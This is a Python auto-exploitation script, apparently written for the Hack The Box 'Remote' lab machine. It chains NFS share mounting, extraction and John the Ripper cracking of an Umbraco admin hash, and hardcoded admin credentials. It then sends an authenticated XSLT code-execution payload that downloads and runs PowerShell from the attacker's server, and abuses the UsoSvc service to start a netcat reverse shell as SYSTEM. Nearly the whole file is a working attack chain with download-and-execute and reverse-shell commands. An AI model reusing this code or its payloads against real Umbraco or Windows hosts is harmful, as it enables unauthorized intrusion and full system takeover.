import requests;
import os
from bs4 import BeautifulSoup;
from termcolor import colored
import re

banner = """
 /$$$$$$$                                      /$$              
| $$__  $$                                    | $$              
| $$  \ $$  /$$$$$$  /$$$$$$/$$$$   /$$$$$$  /$$$$$$    /$$$$$$ 
| $$$$$$$/ /$$__  $$| $$_  $$_  $$ /$$__  $$|_  $$_/   /$$__  $$
| $$__  $$| $$$$$$$$| $$ \ $$ \ $$| $$  \ $$  | $$    | $$$$$$$$
| $$  \ $$| $$_____/| $$ | $$ | $$| $$  | $$  | $$ /$$| $$_____/
| $$  | $$|  $$$$$$$| $$ | $$ | $$|  $$$$$$/  |  $$$$/|  $$$$$$$
|__/  |__/ \_______/|__/ |__/ |__/ \______/    \___/   \_______/
                                                   Auto pwn tool
                                             coded by script1337
                                          Telegram : script1337x
                          Github : https://github.com/ScRiPt1337
"""

how = """
How to use
----------------------------------------------------------------
1. Run SimpleHTTPServer server on same dir (sudo python -m SimpleHTTPServer 80)
2. Make sure Johntheripper,nfs-common is installed
3. copy nc64.exe in current working dir
"""


target = "10.10.10.180"

cwd = os.getcwd()

def print_dict(dico):
    print(dico.items());

def get_ip_address():
    return re.search(re.compile(r'(?<=inet )(.*)(?=/)', re.M), os.popen('ip addr show tun0').read()).groups()[0]

ip = get_ip_address()

def printfc(text, color):
    if color == "red":
        print(colored(text, 'green'))
    if color == "green":
        print(colored(text, 'red'))
    if color == "yellow":
        print(colored(text, 'yellow'))

root = """
new-item C:\script1337 -itemtype directory
Invoke-WebRequest http://{ip}/nc64.exe -OutFile C:\script1337\\nc.exe
sc.exe stop UsoSvc
$command = 'sc.exe config UsoSvc binPath="cmd /c C:\script1337\\nc.exe {ip} 1337 -e cmd.exe"'
iex $command
sc.exe start UsoSvc
""".format(ip=ip)


def getcreds():
    global target,cwd,banner
    if os.path.isdir("script1337"):
        #os.system("mkdir script1337")
        pass
    else:
        os.system("mkdir script1337")
    path = cwd + "/App_Data/Umbraco.sdf"
    printfc("[+]mounting sites backups ", "yellow")
    mount = "sudo mount -t nfs "+target+":/site_backups " + cwd + "/script1337"
    os.system(mount)
    printfc("[+]Dumping hash from sdf file ", "green")
    os.system("head "+ cwd +"/script1337/App_Data/Umbraco.sdf > " + cwd + "/hash.txt")
    os.system("strings " + cwd + "/hash.txt > hashstrings.txt")
    os.remove(cwd+"/hash.txt")
    f=open('hashstrings.txt',"r")
    lines=f.readlines()
    cleanpass = lines[3][20:60]
    username = str(lines[4][5 :-121])

    f=open("cleanpassword.txt", "w+")
    f.write(cleanpass)
    f.close()
    printfc("[+]crecking the hash", "red")
    os.system("sudo john cleanpassword.txt --wordlist=/usr/share/wordlists/rockyou.txt")
    os.system("sudo john --show cleanpassword.txt > creackedpassword.txt")
    os.remove("cleanpassword.txt")
    f = open("creackedpassword.txt", "r")
    lines=f.read()
    passx = str(lines[2:47 - 32 ])
    os.system("clear")
    printfc(banner,"red")
    printfc("[+]username found : " + username, "yellow")
    printfc("[+]password found : " + passx, "green")


def exploit():
    global root

    payload = '''<?xml version="1.0"?><xsl:stylesheet version="1.0" \
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
    xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
    <msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
    { string cmd = "/c powershell IEX (New-Object Net.WebClient).DownloadString('http://'''+ip+'''/payload.ps1\')"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
    proc.StartInfo.FileName = "cmd.exe "; proc.StartInfo.Arguments = cmd;\
    proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
    proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
    </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
    </xsl:template> </xsl:stylesheet> '''
    login = "admin@htb.local";
    password="baconandcheese";
    host = "http://10.10.10.180"
    printfc("[+]Generating payload","red");
    f = open("payload.ps1","w+")
    f.write(root)
    f.close()
    s = requests.session()
    url_main =host+"/umbraco/";
    r1 = s.get(url_main);
    printfc("[+]Login into Umbraco!!!","yellow");
    url_login = host+"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";
    loginfo = {"username":login,"password":password};
    r2 = s.post(url_login,json=loginfo);

    url_xslt = host+"/umbraco/developer/Xslt/xsltVisualize.aspx";
    r3 = s.get(url_xslt);

    soup = BeautifulSoup(r3.text, 'html.parser');
    VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
    VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
    UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
    headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN}
    printfc("[+]Sending Payload...","red");
    data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};

    r4 = s.post(url_xslt,data=data,headers=headers);

    printfc("[+]HOPE WE GET SHELL","green");


printfc(banner,"yellow")
printfc(how,"red")
getcreds()
exploit()

#b8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-40
#b8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
#admin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}
#b8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US8
#bb8be16afba8c314ad33d